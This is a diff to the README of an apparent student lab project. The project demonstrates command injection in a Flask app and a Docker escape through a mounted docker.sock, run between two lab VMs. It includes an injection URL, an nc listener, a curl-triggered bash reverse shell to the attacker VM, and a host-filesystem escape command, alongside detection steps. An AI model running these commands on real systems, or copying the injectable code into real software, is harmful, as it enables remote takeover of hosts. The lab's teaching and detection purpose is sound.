@@ -6,6 +6,32 @@ A demonstration of how a common Docker misconfiguration (mounting `/var/run/dock
 
 ---
 
+## Repo Structure
+
+```
+OS-Project/
+|   README.md
+|
++---host/
+|       app.py          Flask app with the intentional command injection vulnerability
+|       Dockerfile      Builds the NetDiag image, runs as root (intentional for demo)
+|
++---report/
+|       Docker_Escape_Report.docx
+|       Docker_Escape_Report.pdf
+|       Docker_Escape_Presentation_1.pptx
+|       Docker_Escape_Presentation_1.pdf
+|
++---screenshots/        Screenshots used in the presentation
+|
++---scripts/
+        setup.sh        Run on VM1 (victim) to build and start the vulnerable container
+        attack.sh       Run on VM2 (attacker) to walk through the full attack chain
+        detect.sh       Run on VM1 (victim) after the attack to demonstrate detection
+```
+
+---
+
 ## What This Is
 
 A controlled lab environment running two Kali Linux VMs on a VirtualBox NAT Network. One VM runs a deliberately vulnerable Flask app called **NetDiag** inside Docker. The other acts as the attacker.
@@ -20,43 +46,84 @@ No kernel exploits. No CVEs. Just two misconfigurations that are common in real 
 
 ---
 
-## Files
+## Prerequisites
 
+- Two Kali Linux VMs on the same VirtualBox NAT Network
+- Docker installed on VM1 (setup.sh will install it if missing)
+- Both VMs cloned from this repo
+
+---
+
+## Step 0 - Set Your IPs
+
+Before running any script, open `scripts/setup.sh` and `scripts/attack.sh` and set the IP variables at the top to match your actual VM IPs:
+
+```bash
+# In setup.sh
+VICTIM_IP="192.168.98.4"    # IP of VM1
+
+# In attack.sh
+VICTIM_IP="192.168.98.4"    # IP of VM1
+ATTACKER_IP="192.168.98.5"  # IP of VM2
 ```
-app.py        Flask app with the intentional command injection vulnerability
-Dockerfile    Builds the NetDiag image, runs as root (intentional for demo)
+
+To find your IP on either VM:
+
+```bash
+ip a
+```
+
+Make the scripts executable on both VMs after cloning:
+
+```bash
+chmod +x scripts/setup.sh scripts/attack.sh scripts/detect.sh
 ```
 
 ---
 
-## Setup
+## VM Layout
 
-**Both VMs on VirtualBox NAT Network:**
+| VM   | Role                  | Default IP     |
+|------|-----------------------|----------------|
+| VM 1 | Victim (runs Docker)  | 192.168.98.4   |
+| VM 2 | Attacker              | 192.168.98.5   |
 
-| VM | Role | IP |
-|----|------|----|
-| VM 1 | Victim (runs Docker) | 192.168.98.4 |
-| VM 2 | Attacker | 192.168.98.5 |
+---
 
-**On VM 1 - build and run the container with the misconfiguration:**
+## Running the Demo
+
+### On VM1 - start the vulnerable environment
 
 ```bash
-docker build -t netdiag .
-
-docker run -d \
-  -p 5000:5000 \
-  -v /var/run/docker.sock:/var/run/docker.sock \
-  --name netdiag-app \
-  netdiag
+cd OS-Project
+bash scripts/setup.sh
 ```
 
-The `-v /var/run/docker.sock` flag is the intentional misconfiguration.
+This builds the `netdiag` Docker image from `host/` and runs it with the intentional `docker.sock` misconfiguration. The app will be live at `http://<VICTIM_IP>:5000`.
+
+### On VM2 - run the attack
+
+```bash
+cd OS-Project
+bash scripts/attack.sh
+```
+
+This walks through the full attack chain step by step: confirming RCE, opening a reverse shell, and printing the exact commands needed to escape the container via docker.sock.
+
+### On VM1 - demonstrate detection
+
+```bash
+cd OS-Project
+bash scripts/detect.sh
+```
+
+Run this after the attack completes. It checks for proof of compromise, inspects the container mounts, sets up an auditd rule on docker.sock, and shows which processes are touching the socket.
 
 ---
 
 ## The Vulnerability
 
-In `app.py`, the `/ping` route passes user input directly into a shell command:
+In `host/app.py`, the `/ping` route passes user input directly into a shell command:
 
 ```python
 result = os.popen("ping -c 3 " + host).read()
@@ -70,7 +137,7 @@ No sanitization. Anything after a `;` runs as a separate shell command on the se
 
 ### 1. Confirm RCE
 
-From VM 2, visit:
+From VM2, visit:
 
 ```
 http://192.168.98.4:5000/ping?host=8.8.8.8;id
@@ -80,7 +147,7 @@ Response includes `uid=0(root)` - you have remote code execution as root inside 
 
 ### 2. Get a Reverse Shell
 
-Start a listener on VM 2:
+Start a listener on VM2:
 
 ```bash
 nc -lvnp 4444
@@ -92,7 +159,7 @@ Trigger the shell:
 curl "http://192.168.98.4:5000/ping?host=8.8.8.8;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.98.5/4444+0>%261'"
 ```
 
-The browser hangs. VM 2 receives the connection and you are now inside the container as root.
+The browser hangs. VM2 receives the connection and you are now inside the container as root.
 
 ### 3. Stabilize the Shell
 
@@ -125,7 +192,7 @@ docker -H unix:///var/run/docker.sock run -d \
 
 ### 6. Verify Host Compromise
 
-On VM 1, outside any container:
+On VM1, outside any container:
 
 ```bash
 cat /tmp/escaped.txt
@@ -170,17 +237,17 @@ docker run -v /var/run/docker.sock:/var/run/docker.sock ...
 
 ## Quick Reference
 
-| Step | Machine | Command |
-|------|---------|---------|
-| Build image | VM 1 | `docker build -t netdiag .` |
-| Run with sock | VM 1 | `docker run -d -p 5000:5000 -v /var/run/docker.sock:/var/run/docker.sock --name netdiag-app netdiag` |
-| Start listener | VM 2 | `nc -lvnp 4444` |
-| Trigger RCE | VM 2 | visit `?host=8.8.8.8;id` |
-| Reverse shell | VM 2 | curl with bash payload |
-| Find sock | VM 2 (container) | `ls -la /var/run/docker.sock` |
-| Install CLI | VM 2 (container) | `apt-get update && apt-get install -y docker.io` |
-| Escape | VM 2 (container) | `docker -H unix:///var/run/docker.sock run -d -v /:/hostfs --rm alpine chroot /hostfs sh -c '...'` |
-| Prove access | VM 1 (host) | `cat /tmp/escaped.txt` |
+| Step          | Machine           | Command                                                                 |
+|---------------|-------------------|-------------------------------------------------------------------------|
+| Set IPs       | Both VMs          | Edit `VICTIM_IP` / `ATTACKER_IP` at top of each script                 |
+| Make scripts executable | Both VMs | `chmod +x scripts/*.sh`                                              |
+| Start victim  | VM1               | `bash scripts/setup.sh`                                                 |
+| Run attack    | VM2               | `bash scripts/attack.sh`                                                |
+| Detect        | VM1               | `bash scripts/detect.sh`                                                |
+| Trigger RCE   | VM2 (browser)     | `http://<VICTIM_IP>:5000/ping?host=8.8.8.8;id`                         |
+| Find sock     | VM2 (container)   | `ls -la /var/run/docker.sock`                                           |
+| Escape        | VM2 (container)   | `docker -H unix:///var/run/docker.sock run -d -v /:/hostfs --rm alpine chroot /hostfs sh -c '...'` |
+| Prove access  | VM1 (host)        | `cat /tmp/escaped.txt`                                                  |
 
 ---
 
